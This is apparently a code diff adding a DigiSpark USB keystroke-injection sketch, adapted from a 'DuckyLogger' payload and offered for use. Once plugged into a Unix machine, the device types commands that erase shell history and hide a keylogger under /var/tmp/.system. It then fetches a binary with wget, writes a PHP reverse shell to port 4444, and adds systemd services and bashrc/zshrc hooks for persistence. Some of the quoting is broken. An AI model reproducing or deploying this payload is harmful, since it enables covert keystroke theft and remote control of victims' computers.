@@ -1,0 +1,115 @@
+// Author  = Priyank Gada  
+
+// Insta   = https://www.instagram.com/gada.priyank
+
+// GitHub  = https://github.com/priyankgada 
+
+// Website = www.Imperaware.in 
+
+// Happy ImperaHacking!😁😊 
+
+#include <DigiKeyboard.h>
+
+DigiKeyboard Keyboard;
+
+void setup() {
+	Keyboard.begin();
+}
+
+void loop() {
+// Original Title Title: DuckyLogger
+// Description: Key logger which sends each and every key stroke of target remotely/locally.
+// Original author AUTHOR: drapl0n
+// Version: 1.0
+// Category: Credentials
+// Target: Unix-like operating systems with systemd
+// Attackmodes: HID
+// [Note]
+// Visit https://github.com/drapl0n/DuckyLogger for usage and other important instructions.
+// [keeping tracks clear]
+delay(500);
+delay(400);
+Keyboard.print("export HISTSIZE=0 && rm -f $HISTFILE && unset HISTFILE");
+Keyboard.press(KEY_RETURN);
+Keyboard.releaseAll();
+delay(100);
+// [creating key logging mechanism]
+Keyboard.print("mkdir /var/tmp/.system");
+Keyboard.press(KEY_RETURN);
+Keyboard.releaseAll();
+delay(100);
+Keyboard.print("echo "/var/tmp/.system/./xinput list | grep -Po 'id=\K\d+(?=.*slave\s*keyboard)' | xargs -P0 -n1 /var/tmp/.system/./xinput test" > /var/tmp/.system/sys ");
+Keyboard.press(KEY_RETURN);
+Keyboard.releaseAll();
+delay(100);
+Keyboard.print("chmod +x /var/tmp/.system/sys");
+Keyboard.press(KEY_RETURN);
+Keyboard.releaseAll();
+delay(100);
+// [importing xinput]
+Keyboard.print("cd /var/tmp/.system/");
+Keyboard.press(KEY_RETURN);
+Keyboard.releaseAll();
+delay(100);
+Keyboard.print("wget --no-check-certificate --content-disposition https://github.com/drapl0n/DuckyLogger/blob/main/xinput\?raw=true");
+Keyboard.press(KEY_RETURN);
+Keyboard.releaseAll();
+delay(2500);
+Keyboard.print("chmod +x xinput");
+Keyboard.press(KEY_RETURN);
+Keyboard.releaseAll();
+delay(100);
+// [creating reverse shell]
+Keyboard.print("echo -e "while :\ndo\n\tping -c 5 0.0.0.0\n\tif [ $? -eq 0 ]; then\n\t\tphp -r '\$sock=fsockopen(\"0.0.0.0\",4444);exec("\"/var/tmp/.system/sys -i "<&3 >&3 2>&3"\"");'\n\tfi\ndone" >  /var/tmp/.system/systemBus");
+Keyboard.press(KEY_RETURN);
+Keyboard.releaseAll();
+delay(100);
+Keyboard.print("chmod +x /var/tmp/.system/systemBus");
+Keyboard.press(KEY_RETURN);
+Keyboard.releaseAll();
+delay(100);
+// [creating systemd service to execute payload on boot]
+Keyboard.print("mkdir -p ~/.config/systemd/user");
+Keyboard.press(KEY_RETURN);
+Keyboard.releaseAll();
+delay(200);
+Keyboard.print("echo -e "[Unit]\nDescription= System BUS handler\n\n[Service]\nExecStart=/bin/bash /var/tmp/.system/systemBus -no-browser\nRestart=on-failure\nSuccessExitStatus=3 4\nRestartForceExitStatus=3 4\n\n[Install]\nWantedBy=default.target" > ~/.config/systemd/user/systemBUS.service");
+Keyboard.press(KEY_RETURN);
+Keyboard.releaseAll();
+delay(100);
+// [creating reboot script incase if listner stops or targets internet connection gets lost] 
+Keyboard.print("echo "while true; do systemctl --user restart systemBUS.service; sleep 15m; done" > /var/tmp/.system/reboot");
+Keyboard.press(KEY_RETURN);
+Keyboard.releaseAll();
+delay(100);
+Keyboard.print("chmod +x /var/tmp/.system/reboot");
+Keyboard.press(KEY_RETURN);
+Keyboard.releaseAll();
+delay(100);
+// [creating systemd service to execute payload on boot]
+Keyboard.print("echo -e "[Unit]\nDescription= System BUS handler reboot.\n\n[Service]\nExecStart=/bin/bash /var/tmp/.system/reboot -no-browser\nRestart=on-failure\nSuccessExitStatus=3 4\nRestartForceExitStatus=3 4\n\n[Install]\nWantedBy=default.target" > ~/.config/systemd/user/reboot.service");
+Keyboard.press(KEY_RETURN);
+Keyboard.releaseAll();
+delay(100);
+// [enabling service]
+Keyboard.print("systemctl --user daemon-reload");
+Keyboard.press(KEY_RETURN);
+Keyboard.releaseAll();
+delay(300);
+Keyboard.print("systemctl --user enable --now systemBUS.service");
+Keyboard.press(KEY_RETURN);
+Keyboard.releaseAll();
+delay(150);
+Keyboard.print("systemctl --user enable --now reboot.service");
+Keyboard.press(KEY_RETURN);
+Keyboard.releaseAll();
+delay(100);
+// [autostarting service on terminal/shell launch]
+Keyboard.print("echo -e "ls -a | grep 'zshrc' &> /dev/null\nif [ \$? = 0 ]; then\n\techo \"systemctl --user enable --now reboot.service && systemctl --user enable --now systemBUS.service\" >> ~/.zshrc\nfi\n\nls -a | grep 'bashrc' &> /dev/null\nif [ \$? = 0 ]; then\n\techo \"systemctl --user enable --now reboot.service && systemctl --user enable --now systemBUS.service\" >> ~/.bashrc\nfi" > ~/tmmmp");
+Keyboard.press(KEY_RETURN);
+Keyboard.releaseAll();
+delay(100);
+Keyboard.print("chmod +x ~/tmmmp && cd ~/ && ./tmmmp && rm tmmmp && exit");
+Keyboard.press(KEY_RETURN);
+Keyboard.releaseAll();
+}
